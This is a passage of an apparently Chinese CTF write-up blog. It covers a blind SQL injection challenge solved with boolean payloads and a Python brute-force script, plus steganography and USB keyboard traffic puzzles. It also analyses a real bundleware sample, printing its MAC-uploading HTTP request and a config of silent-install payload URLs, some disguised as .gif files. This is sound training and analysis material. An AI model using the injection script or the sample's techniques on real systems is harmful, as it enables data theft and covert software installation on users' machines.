+<span class="line"><span>1a == 1          TRUE</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>http://119.29.191.200/ctf/46d3e59de07a6aac6b2078c35aa4c16a03d10df3/?num=1a</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h1 id="重重flag背后隐藏的秘密" tabindex="-1"><a class="header-anchor" href="#重重flag背后隐藏的秘密"><span>重重flag背后隐藏的秘密</span></a></h1><p>正则表达式筛选可以得到答案。</p><h1 id="一张含有信息的图片" tabindex="-1"><a class="header-anchor" href="#一张含有信息的图片"><span>一张含有信息的图片</span></a></h1><p>古时候打仗，友军间通信为了不被敌人发现重要的情报，用了各种各样的方法隐藏信息，延续到了现代，又有了新的变化...</p><p>binwalk发现zlib ， 解压发现exif ，没头绪，放进Photoshop ，调色，发现flag。看到flag内容又get到一个新工具。</p><h1 id="一个简陋的博客" tabindex="-1"><a class="header-anchor" href="#一个简陋的博客"><span>一个简陋的博客</span></a></h1><p>前端的X同学做一半跑路了，反正功能实现了，能上传文章就行（逃。。。</p><p>对前几天才接触CTF的喔来说，这道题一直没有头绪，直到看到了这篇文章 <a href="http://www.lujza.me/%E5%AE%9E%E9%AA%8C%E5%90%A7ctf%E4%B9%8Bweb%E4%B8%93%E9%A2%98-2.html" target="_blank" rel="noopener noreferrer">实验吧CTF之web专题-2</a> 原来是这样的</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>?id=&#39;               FALSE</span></span>
+<span class="line"><span>?id=1 &#39;and &#39;1&#39;=&#39;1   TRUE</span></span>
+<span class="line"><span>?id=1 &#39;and &#39;1&#39;=&#39;2   FALSE</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>现在可以猜密码了。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>(select count(*) from flag)&gt;0</span></span>
+<span class="line"><span>(select flag from flag)&gt; 0</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>于是得到flag ，但不知为何，提交说答案错误，后来发现全是小写。所以要注意了。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>flAG{3Q1Map_1S_u3Sfu1}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>代码记录</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>import requests</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>url = &quot;http://119.29.191.200/ctf/7601547c91c318b3f60df2a6f1f7b69a407affa2/index.php?id=11864&quot;</span></span>
+<span class="line"><span>strs = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIGKLMNOPQRSTUVWXYZ@_.{}-&quot;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def check_flag_len():</span></span>
+<span class="line"><span>    flag_len = 0</span></span>
+<span class="line"><span>    for i in range(0, 500):</span></span>
+<span class="line"><span>        sql = &quot;%27%20and%20(select%20length(flag)%20from%20flag)%3E&quot; + str(i) + &quot;%23)&quot;</span></span>
+<span class="line"><span>        result = requests.get(url+sql)</span></span>
+<span class="line"><span>        if not result.text.find(&quot;HELLO&quot;) &gt; 0:</span></span>
+<span class="line"><span>            flag_len = i - 1</span></span>
+<span class="line"><span>            break</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    return flag_len</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def find_flag(flag_len):</span></span>
+<span class="line"><span>    flag = &quot;&quot;</span></span>
+<span class="line"><span>    while len(flag) &lt; flag_len:</span></span>
+<span class="line"><span>        for i in strs:</span></span>
+<span class="line"><span>            sql = &quot;%27%20and%20substring((select%20flag%20from%20flag%20)%20from%20&quot; + str(len(flag)+1) + &quot;%20for%201%20)=%27&quot; + i</span></span>
+<span class="line"><span>            result = requests.get(url+sql)</span></span>
+<span class="line"><span>            if result.text.find(&quot;HELLO&quot;) &gt; 0:</span></span>
+<span class="line"><span>                flag = flag + i</span></span>
+<span class="line"><span>                print(flag)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h1 id="一段奇怪的流量" tabindex="-1"><a class="header-anchor" href="#一段奇怪的流量"><span>一段奇怪的流量</span></a></h1><p>X同学最近抓了一个流量包，你能分析下包的内容吗？</p><p>用Wireshark打开，发现是USB流量包。没有思路，于是搜索发现一篇文章。<a href="http://bobao.360.cn/learning/detail/3351.html" target="_blank" rel="noopener noreferrer">【技术分享】从CTF中学USB流量捕获</a></p><p>这个USB流量包也许就是鼠标或键盘的流量，然后通过观察Wireshark流量，中间有一段非常规律，不连续的流量。十六进制符合键盘流量的特征。<br><img src="http://7xkmnm.com1.z0.glb.clouddn.com/截图1.PNG" alt="image"></p><p>参考文章的程序，提取出一段数据。貌似没有区分大小写，看文档，大小写都是同一个信号。</p><blockquote><p>Usage of keys is not modified by the state of the Control, Alt, Shift or Num Lock keys. That is, a key does not send extra codes to compensate for the state of any Control, Alt, Shift or Num Lock key.</p></blockquote><p>发现数据是十六进制，解码看起来是个压缩文件。解压得到flag。</p><h1 id="舍友的秘密" tabindex="-1"><a class="header-anchor" href="#舍友的秘密"><span>舍友的秘密</span></a></h1><p>有一天机智的X同学发现流量中有些异常，好像这个软件上传了舍友的信息，最重要的是上传了某个地址信息，你能找出这个地址信息吗</p><p>注1：提交形式：flag{xx-xx-xx-xx-xx-xx}(其中xx为16进制，且全部小写)</p><p>注2：该题需在writeup中提交详细报告</p><p>警告：这是真实恶意样本，含有信息收集行为，请在虚拟机打开</p><p>答案： 上传的是本机的MAC地址</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>Address: Vmware_3e:12:85 (00:0c:29:3e:12:85)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="报告" tabindex="-1"><a class="header-anchor" href="#报告"><span>报告：</span></a></h2><p>题目提示：</p><ol><li>flag{xx-xx-xx-xx-xx-xx}(其中xx为16进制，且全部小写)。</li><li>恶意样本，在虚拟机内执行</li></ol><p>题目文件：</p><ol><li>恶意样本</li><li>数据包</li></ol><p>打算用ProcessMonitor看它的行为。 运行后收集到了相关的行为。把收集到的行为保存格式是csv。恶意软件的主要进程是</p><blockquote><p>1.6.4@302_111085.exe</p></blockquote><p>用python简单过滤处理下</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>import csv</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>names = [&#39;1.6.4@302_111085.exe&#39;]</span></span>
+<span class="line"><span>output = open(&#39;output.csv&#39;,&#39;wb&#39;)</span></span>
+<span class="line"><span>write_csv = csv.writer(output)</span></span>
+<span class="line"><span>read_csv= csv.reader(open(&#39;Logfile2.csv&#39;,&#39;r&#39;))</span></span>
+<span class="line"><span>for row in read_csv:</span></span>
+<span class="line"><span>    for i in names:</span></span>
+<span class="line"><span>        if row[1] == i:</span></span>
+<span class="line"><span>            write_csv.writerow(row)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>为了分析的方便，用excel对数据进行处理，重点是上传下载，将相应的行为标记上颜色。 <img src="http://7xkmnm.com1.z0.glb.clouddn.com/xls1.PNG" alt="image"></p><p>1.6.4@302_111085.exe<br> 打开后没有操作的情况下频繁地对系统文件进行读写操作，未经用户同意释放软件安装包，恶意软件无疑。</p><p>发现一个很可疑的ip <img src="http://7xkmnm.com1.z0.glb.clouddn.com/xls2.PNG" alt="image"></p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>VM-PC:49160 -&gt; 121.43.97.175:http</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>于是打开wireshark输入 ip.addr == 121.43.97.175</p><p>选择该ip以追踪HTTP流，然后就得到了软件的第一次联网数据。</p><p>这段数据是不是看起来很正常呢？ 不是，很明显恶意软件在通过api获取推广软件的下载地址。 既然要做推广必然要标记用户，所以收集用户信息是非常常见的流氓行为。</p><blockquote><p>GET /api.php?id=111085&amp;qid=302&amp;rand=52231541381&amp;flag=328704&amp;title=1.6.4&amp;t=0 HTTP/1.1</p></blockquote><p>这里可以看到软件通过GET请求上传了用户信息，据我猜测，地址信息应该不是ip地址，那应该就是网卡的mac地址了。<br> 转换成十进制 就是rand这个参数没跑了。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>00:0c:29:3e:12:85 </span></span>
+<span class="line"><span>52231541381</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>这里附上相关的数据和文件</p><p><a href="http://7xkmnm.com1.z0.glb.clouddn.com/output.xls" target="_blank" rel="noopener noreferrer">1.6.4@302_111085.exe 行为</a></p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>GET /api.php?id=111085&amp;qid=302&amp;rand=52231541381&amp;flag=328704&amp;title=1.6.4&amp;t=0 HTTP/1.1</span></span>
+<span class="line"><span>User-Agent: NSIS_Inetc (Mozilla)</span></span>
+<span class="line"><span>Host: down.xiald.com</span></span>
+<span class="line"><span>Connection: Keep-Alive</span></span>
+<span class="line"><span>Cache-Control: no-cache</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>HTTP/1.1 200 OK</span></span>
+<span class="line"><span>Content-Type: text/html</span></span>
+<span class="line"><span>Server: Microsoft-IIS/7.5</span></span>
+<span class="line"><span>X-Powered-By: PHP/5.3.28</span></span>
+<span class="line"><span>Date: Mon, 07 Aug 2017 03:17:26 GMT</span></span>
+<span class="line"><span>Content-Length: 915</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>{&quot;error&quot;:0,&quot;data&quot;:{&quot;Name&quot;:&quot;我的世界1.6.4懒人包&quot;,&quot;Desc&quot;:&quot;我的世界1.6.4懒人包是玩家整合的一款minecraft大型mod整合包，包括玩家们都非常喜欢的工业、、农业、超级英雄、枪械等mod，市面上很少见噢，需要的朋友赶紧拉游戏操作方法移动：W、S、A、D物品：E跳跃：空格前行：左Shift攻击：鼠标左键使用：鼠标右键视角&quot;,&quot;URL&quot;:&quot;http:\/\/gm2.pc6.com\/hs1\/pc6mc164-mcsetup.exe&quot;,&quot;Ver&quot;:&quot;&quot;,&quot;Size&quot;:&quot;271360&quot;,&quot;Icon&quot;:&quot;http:\/\/7.pic.pc6.com\/up\/2014-4\/2014430162429.jpg&quot;,&quot;File&quot;:&quot;pc6mc164-mcsetup.exe&quot;}}GET /cfg.php?id=111085&amp;qid=302&amp;rand=52231541381&amp;flag=328704&amp;title=1.6.4&amp;t=0 HTTP/1.1</span></span>
+<span class="line"><span>User-Agent: NSIS_Inetc (Mozilla)</span></span>
+<span class="line"><span>Host: down.xiald.com</span></span>
+<span class="line"><span>Connection: Keep-Alive</span></span>
+<span class="line"><span>Cache-Control: no-cache</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>HTTP/1.1 200 OK</span></span>
+<span class="line"><span>Content-Type: text/html</span></span>
+<span class="line"><span>Server: Microsoft-IIS/7.5</span></span>
+<span class="line"><span>X-Powered-By: PHP/5.3.28</span></span>
+<span class="line"><span>Date: Mon, 07 Aug 2017 03:17:26 GMT</span></span>
+<span class="line"><span>Content-Length: 8357</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[rec]</span></span>
+<span class="line"><span>N_1=............</span></span>
+<span class="line"><span>Z_1=230</span></span>
+<span class="line"><span>O_1=1</span></span>
+<span class="line"><span>D_1=..............</span></span>
+<span class="line"><span>I_1=http://down.shg20.com/shichangbu/ico/zny.ico</span></span>
+<span class="line"><span>U_1=http://down.znyshurufa.com/qdb/zny_znylxnb101.exe</span></span>
+<span class="line"><span>F_1=zny_znylxnb101.exe</span></span>
+<span class="line"><span>P_1=/S</span></span>
+<span class="line"><span>C_1=2</span></span>
+<span class="line"><span>R_1=2</span></span>
+<span class="line"><span>S_1=SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\............</span></span>
+<span class="line"><span>V_1=UninstallString</span></span>
+<span class="line"><span>Y_1=0</span></span>
+<span class="line"><span>L_1=0</span></span>
+<span class="line"><span>E_1=app230</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>N_2=....</span></span>
+<span class="line"><span>Z_2=187</span></span>
+<span class="line"><span>O_2=1</span></span>
+<span class="line"><span>D_2=..............</span></span>
+<span class="line"><span>I_2=http://xiazai.xiazai2.net/ico/kuaizip.ico</span></span>
+<span class="line"><span>U_2=http://dl.kkdownload.com/kz5lixjm3/KuaiZip_Setup_3818139782_lixjm3_001.exe</span></span>
+<span class="line"><span>F_2=KuaiZip_Setup_3818139782_lixjm3_001.exe</span></span>
+<span class="line"><span>P_2=</span></span>
+<span class="line"><span>C_2=1</span></span>
+<span class="line"><span>R_2=2</span></span>
+<span class="line"><span>S_2=SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\KuaiZip</span></span>
+<span class="line"><span>Y_2=0</span></span>
+<span class="line"><span>L_2=0</span></span>
+<span class="line"><span>M_2=</span></span>
+<span class="line"><span>X_2=</span></span>
+<span class="line"><span>FN_2=</span></span>
+<span class="line"><span>FU_2=</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>N_3=QQ............</span></span>
+<span class="line"><span>Z_3=140</span></span>
+<span class="line"><span>O_3=1</span></span>
+<span class="line"><span>D_3=..............</span></span>
+<span class="line"><span>I_3=http://down.shg20.com/shichangbu/ico/qqbrowser.ico</span></span>
+<span class="line"><span>U_3=http://misc.wcd.qq.com/app?packageName=pcqqbrowser&amp;channelId=87698</span></span>
+<span class="line"><span>F_3=V9._87698_20161028150508.exe</span></span>
+<span class="line"><span>P_3=</span></span>
+<span class="line"><span>C_3=2</span></span>
+<span class="line"><span>R_3=2</span></span>
+<span class="line"><span>S_3=SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\QQBrowser.exe</span></span>
+<span class="line"><span>V_3=path</span></span>
+<span class="line"><span>Y_3=0</span></span>
+<span class="line"><span>L_3=0</span></span>
+<span class="line"><span>M_3=</span></span>
+<span class="line"><span>X_3=QQ......</span></span>
+<span class="line"><span>FN_3=</span></span>
+<span class="line"><span>FU_3=</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>N_4=............</span></span>
+<span class="line"><span>Z_4=46</span></span>
+<span class="line"><span>O_4=1</span></span>
+<span class="line"><span>D_4=............</span></span>
+<span class="line"><span>I_4=http://down.shg20.com/shichangbu/ico/aqrj.ico</span></span>
+<span class="line"><span>U_4=http://dl.360safe.com/p/Setup_oemyinsu5.exe</span></span>
+<span class="line"><span>F_4=Setup_oemyinsu5.exe</span></span>
+<span class="line"><span>P_4=</span></span>
+<span class="line"><span>C_4=2</span></span>
+<span class="line"><span>R_4=2</span></span>
+<span class="line"><span>S_4=SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\360........</span></span>
+<span class="line"><span>V_4=UninstallString</span></span>
+<span class="line"><span>Y_4=0</span></span>
+<span class="line"><span>L_4=2</span></span>
+<span class="line"><span>M_4=</span></span>
+<span class="line"><span>X_4=</span></span>
+<span class="line"><span>FN_4=</span></span>
+<span class="line"><span>FU_4=</span></span>
+<span class="line"><span>N_5=......</span></span>
+<span class="line"><span>Z_5=104</span></span>
+<span class="line"><span>O_5=1</span></span>
+<span class="line"><span>D_5=............</span></span>
+<span class="line"><span>I_5=http://xiazai.xiazai2.net/ico/pps.ico</span></span>
+<span class="line"><span>U_5=http://dl.static.iqiyi.com/hz/IQIYIsetup_gaoxin@kb004.exe</span></span>
+<span class="line"><span>F_5=IQIYIsetup_gaoxin@kb004.exe</span></span>
+<span class="line"><span>P_5=</span></span>
+<span class="line"><span>C_5=1</span></span>
+<span class="line"><span>R_5=2</span></span>
+<span class="line"><span>S_5=SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\PPStream</span></span>
+<span class="line"><span>Y_5=0</span></span>
+<span class="line"><span>L_5=0</span></span>
+<span class="line"><span>X_5=</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>N_6=2345......</span></span>
+<span class="line"><span>Z_6=284</span></span>
+<span class="line"><span>O_6=1</span></span>
+<span class="line"><span>D_6=..........</span></span>
+<span class="line"><span>I_6=http://down.shg20.com/shichangbu/ico/2345Explorer.ico</span></span>
+<span class="line"><span>U_6=http://download.2345.com/union_common/2345explorer_39244138011_Y_silence.exe</span></span>
+<span class="line"><span>F_6=2345explorer_39244138011_Y_silence.exe</span></span>
+<span class="line"><span>P_6=</span></span>
+<span class="line"><span>C_6=2</span></span>
+<span class="line"><span>R_6=2</span></span>
+<span class="line"><span>S_6=SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\2345Explorer</span></span>
+<span class="line"><span>V_6=UninstallString</span></span>
+<span class="line"><span>Y_6=0</span></span>
+<span class="line"><span>L_6=0</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>N_7=........</span></span>
+<span class="line"><span>Z_7=294</span></span>
+<span class="line"><span>O_7=1</span></span>
+<span class="line"><span>D_7=............</span></span>
+<span class="line"><span>I_7=http://down.shg20.com/shichangbu/ico/qqlive.ico</span></span>
+<span class="line"><span>U_7=http://down.shg20.com/shichangbu/QQliveSetup_30_241.gif</span></span>
+<span class="line"><span>F_7=QQliveSetup_30_241.exe</span></span>
+<span class="line"><span>P_7=</span></span>
+<span class="line"><span>C_7=2</span></span>
+<span class="line"><span>R_7=2</span></span>
+<span class="line"><span>S_7=SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\qqlive</span></span>
+<span class="line"><span>V_7=UninstallString</span></span>
+<span class="line"><span>Y_7=0</span></span>
+<span class="line"><span>L_7=0</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>N_8=......</span></span>
+<span class="line"><span>Z_8=227</span></span>
+<span class="line"><span>O_8=1</span></span>
+<span class="line"><span>D_8=............</span></span>
+<span class="line"><span>I_8=http://down.shg20.com/shichangbu/ico/ludashi.ico</span></span>
+<span class="line"><span>U_8=http://dl.360safe.com/ludashi/inst_newspread.exe</span></span>
+<span class="line"><span>F_8=inst_newspread.exe</span></span>
+<span class="line"><span>P_8=</span></span>
+<span class="line"><span>C_8=2</span></span>
+<span class="line"><span>R_8=2</span></span>
+<span class="line"><span>S_8=SOFTWARE\LuDaShi</span></span>
+<span class="line"><span>V_8=Setup Path</span></span>
+<span class="line"><span>Y_8=0</span></span>
+<span class="line"><span>L_8=0</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>N_9=..........</span></span>
+<span class="line"><span>Z_9=231</span></span>
+<span class="line"><span>O_9=1</span></span>
+<span class="line"><span>D_9=..........</span></span>
+<span class="line"><span>I_9=http://down.shg20.com/shichangbu/ico/xiaohei.ico</span></span>
+<span class="line"><span>U_9=http://d.heinote.com/downloads/gaoxin/HNInstall_Setup_2207846935_gaoxin_001.exe</span></span>
+<span class="line"><span>F_9=HNInstall_Setup_2207846935_gaoxin_001.exe</span></span>
+<span class="line"><span>P_9=</span></span>
+<span class="line"><span>C_9=2</span></span>
+<span class="line"><span>R_9=2</span></span>
+<span class="line"><span>S_9=SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Heinote</span></span>
+<span class="line"><span>V_9=UninstallString</span></span>
+<span class="line"><span>Y_9=0</span></span>
+<span class="line"><span>L_9=0</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>N_10=........</span></span>
+<span class="line"><span>Z_10=269</span></span>
+<span class="line"><span>O_10=1</span></span>
+<span class="line"><span>D_10=............</span></span>
+<span class="line"><span>I_10=http://down.shg20.com/shichangbu/ico/youxun.ico</span></span>
+<span class="line"><span>U_10=http://nkme.ddlives.com/YouXiHe/ydtg.exe</span></span>
+<span class="line"><span>F_10=ydtg.exe</span></span>
+<span class="line"><span>P_10=hide</span></span>
+<span class="line"><span>C_10=2</span></span>
+<span class="line"><span>R_10=1</span></span>
+<span class="line"><span>S_10=Software\Microsoft\Windows\CurrentVersion\Uninstall\leyoubox</span></span>
+<span class="line"><span>V_10=UninstallString</span></span>
+<span class="line"><span>Y_10=0</span></span>
+<span class="line"><span>L_10=0</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>N_11=........</span></span>
+<span class="line"><span>Z_11=252</span></span>
+<span class="line"><span>O_11=1</span></span>
+<span class="line"><span>D_11=..............</span></span>
+<span class="line"><span>I_11=http://down.shg20.com/shichangbu/ico/huayzb.ico</span></span>
+<span class="line"><span>U_11=http://dldir1.qq.com/huayang/HuaYangSetup_50059noui.exe</span></span>
+<span class="line"><span>F_11=HuaYangSetup_50059noui.exe</span></span>
+<span class="line"><span>P_11=</span></span>
+<span class="line"><span>C_11=2</span></span>
+<span class="line"><span>R_11=1</span></span>
+<span class="line"><span>S_11=SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\........</span></span>
+<span class="line"><span>V_11=UninstallString</span></span>
+<span class="line"><span>Y_11=0</span></span>
+<span class="line"><span>L_11=0</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>N_12=..........</span></span>
+<span class="line"><span>Z_12=217</span></span>
+<span class="line"><span>O_12=1</span></span>
+<span class="line"><span>D_12=............</span></span>
+<span class="line"><span>I_12=http://down.shg20.com/shichangbu/ico/wnktw.ico</span></span>
+<span class="line"><span>U_12=http://down.shg20.com/shichangbu/setup_wnktlxnb003.gif</span></span>
+<span class="line"><span>F_12=setup_wnktlxnb003.exe</span></span>
+<span class="line"><span>P_12=</span></span>
+<span class="line"><span>C_12=2</span></span>
+<span class="line"><span>R_12=2</span></span>
+<span class="line"><span>S_12=SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\..........</span></span>
+<span class="line"><span>V_12=UninstallString</span></span>
+<span class="line"><span>Y_12=0</span></span>
+<span class="line"><span>L_12=0</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>N_13=Clover</span></span>
+<span class="line"><span>Z_13=264</span></span>
+<span class="line"><span>O_13=1</span></span>
+<span class="line"><span>D_13=..............</span></span>
+<span class="line"><span>I_13=http://down.shg20.com/shichangbu/ico/Clover.ico</span></span>
+<span class="line"><span>U_13=http://down.shg20.com/shichangbu/setup_clvlxnb002.gif</span></span>
+<span class="line"><span>F_13=setup_clvlxnb002.exe</span></span>
+<span class="line"><span>P_13=/S</span></span>
+<span class="line"><span>C_13=2</span></span>
+<span class="line"><span>R_13=2</span></span>
+<span class="line"><span>S_13=SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Clover</span></span>
+<span class="line"><span>V_13=UninstallString</span></span>
+<span class="line"><span>Y_13=0</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>L_13=0</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>N_14=........</span></span>
+<span class="line"><span>Z_14=278</span></span>
+<span class="line"><span>O_14=1</span></span>
+<span class="line"><span>D_14=............</span></span>
+<span class="line"><span>I_14=http://down.shg20.com/shichangbu/ico/fengxbfq.ico</span></span>
+<span class="line"><span>U_14=http://down.shg20.com/shichangbu/FunVPlayerInstall_PS_0108201.gif</span></span>
+<span class="line"><span>F_14=FunVPlayerInstall_PS_0108201.exe</span></span>
+<span class="line"><span>P_14=</span></span>
+<span class="line"><span>C_14=2</span></span>
+<span class="line"><span>R_14=2</span></span>
+<span class="line"><span>S_14=SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\..........</span></span>
+<span class="line"><span>V_14=UninstallString</span></span>
+<span class="line"><span>Y_14=0</span></span>
+<span class="line"><span>L_14=0</span></span>
+<span class="line"><span>E_14=app278</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>N_15=........</span></span>
+<span class="line"><span>Z_15=287</span></span>
+<span class="line"><span>O_15=1</span></span>
+<span class="line"><span>D_15=..............</span></span>
+<span class="line"><span>I_15=http://down.shg20.com/shichangbu/ico/koowo.ico</span></span>
+<span class="line"><span>U_15=http://down.kuwo.cn/mbox/kuwo_jm795.exe</span></span>
+<span class="line"><span>F_15=kuwo_jm795.exe</span></span>
+<span class="line"><span>P_15=</span></span>
+<span class="line"><span>C_15=2</span></span>
+<span class="line"><span>R_15=2</span></span>
+<span class="line"><span>S_15=SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\KwMusic7</span></span>
+<span class="line"><span>V_15=UninstallString</span></span>
+<span class="line"><span>Y_15=0</span></span>
+<span class="line"><span>L_15=0</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>N_16=2345......</span></span>
+<span class="line"><span>Z_16=192</span></span>
+<span class="line"><span>O_16=1</span></span>
+<span class="line"><span>D_16=........</span></span>
+<span class="line"><span>I_16=http://down.shg20.com/sc/ico/2345pic.ico</span></span>
+<span class="line"><span>U_16=http://down.shg20.com/shichangbu/2345pic_lm_509762_v8.0.1.8020_silent.gif</span></span>
+<span class="line"><span>F_16=2345pic_lm_509762_v8.0.1.8020_silent.exe</span></span>
+<span class="line"><span>P_16=</span></span>
+<span class="line"><span>C_16=2</span></span>
+<span class="line"><span>R_16=2</span></span>
+<span class="line"><span>S_16=SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\2345Pic</span></span>
+<span class="line"><span>V_16=UninstallString</span></span>
+<span class="line"><span>Y_16=0</span></span>
+<span class="line"><span>L_16=0</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>N_17=WPS</span></span>
+<span class="line"><span>Z_17=157</span></span>
+<span class="line"><span>O_17=1</span></span>
+<span class="line"><span>D_17=............</span></span>
+<span class="line"><span>I_17=http://down.shg20.com/shichangbu/ico/wps.ico</span></span>
+<span class="line"><span>U_17=http://wdl1.cache.wps.cn/wps/download/W.P.S.6135.20.2498.exe</span></span>
+<span class="line"><span>F_17=W.P.S.6135.20.2498.exe</span></span>
+<span class="line"><span>P_17=</span></span>
+<span class="line"><span>C_17=2</span></span>
+<span class="line"><span>R_17=1</span></span>
+<span class="line"><span>S_17=Software\Microsoft\Windows\CurrentVersion\Uninstall\Kingsoft Office</span></span>
+<span class="line"><span>V_17=UninstallString</span></span>
+<span class="line"><span>Y_17=0</span></span>
+<span class="line"><span>L_17=0</span></span>
+<span class="line"><span>M_17=</span></span>
+<span class="line"><span>X_17=1</span></span>
+<span class="line"><span>FN_17=</span></span>
+<span class="line"><span>FU_17=</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>N_18=PPTV</span></span>
+<span class="line"><span>Z_18=221</span></span>
+<span class="line"><span>O_18=1</span></span>
+<span class="line"><span>D_18=............</span></span>
+<span class="line"><span>I_18=http://down.shg20.com/shichangbu/ico/pptv.ico</span></span>
+<span class="line"><span>U_18=http://download.pplive.com/PPTV_forqd3407_4030023.exe</span></span>
+<span class="line"><span>F_18=PPTV_forqd3407_4030023.exe</span></span>
+<span class="line"><span>P_18=</span></span>
+<span class="line"><span>C_18=2</span></span>
+<span class="line"><span>R_18=2</span></span>
+<span class="line"><span>S_18=SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\PPLive</span></span>
+<span class="line"><span>V_18=UninstallString</span></span>
+<span class="line"><span>Y_18=0</span></span>
+<span class="line"><span>L_18=0</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>N_19=91........</span></span>
+<span class="line"><span>Z_19=209</span></span>
